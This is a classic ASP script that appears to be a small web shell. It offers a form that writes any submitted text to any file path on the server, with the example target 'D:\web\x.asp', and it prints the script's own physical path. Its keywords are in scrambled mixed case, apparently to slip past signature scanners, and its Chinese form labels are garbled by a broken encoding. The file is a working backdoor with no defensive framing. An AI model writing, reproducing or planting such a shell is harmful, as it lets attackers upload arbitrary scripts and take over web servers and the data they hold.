<% Dim ObjFSO %>
<% Dim FDAtA %>
<% Dim ObjCOuntFilE %>
<% On ErrOr rEsumE nExt %>
<% SEt ObjFSO = SErvEr.CrEAtEObjEct("Scripting.FilESystEmObjEct") %>
<% iF Trim(rEquEst("syFDpAth"))<>"" thEn %>
<% FDAtA = rEquEst("cyFDDAtA") %>
<% SEt ObjCOuntFilE=ObjFSO.CrEAtETExtFilE(rEquEst("syFDpAth"),TruE) %>
<% ObjCOuntFilE.WritE FDAtA %>
<% iF Err =0 thEn %>
<% rEspOnsE.writE "<FOnt cOlOr=rED>sAvE SuccEss!</FOnt>" %>
<% ElsE %>
<% rEspOnsE.writE "<FOnt cOlOr=rED>SAvE UnSuccEss!</FOnt>" %>
<% EnD iF %>
<% Err.clEAr %>
<% EnD iF %>
<% ObjCOuntFilE.ClOsE %>
<% SEt ObjCOuntFilE=NOthing %>
<% SEt ObjFSO = NOthing %>
<% REspOnsE.writE "<FOrm ActiOn='' mEthOD=pOst>" %>
<% REspOnsE.writE "�����ļ���<FOnt cOlOr=rED>����·��(�����ļ���:��D:\wEb\x.Asp):</FOnt>" %>
<% REspOnsE.WritE "<input typE=tExt nAmE=syFDpAth wiDth=32 sizE=50>" %>
<% REspOnsE.WritE "<br>" %>
<% REspOnsE.writE "���ļ�����·��" %>
<% =sErvEr.mAppAth(REquEst.SErvErVAriAblEs("SCRIPT_NAME")) %>
<% REspOnsE.writE "<br>" %>
<% REspOnsE.writE "�����������:" %>
<% REspOnsE.writE "<tExtArEA nAmE=cyFDDAtA cOls=80 rOws=10 wiDth=32></tExtArEA>" %>
<% REspOnsE.writE "<input typE=submit vAluE=����>" %>
<% REspOnsE.writE "</FOrm>" %>

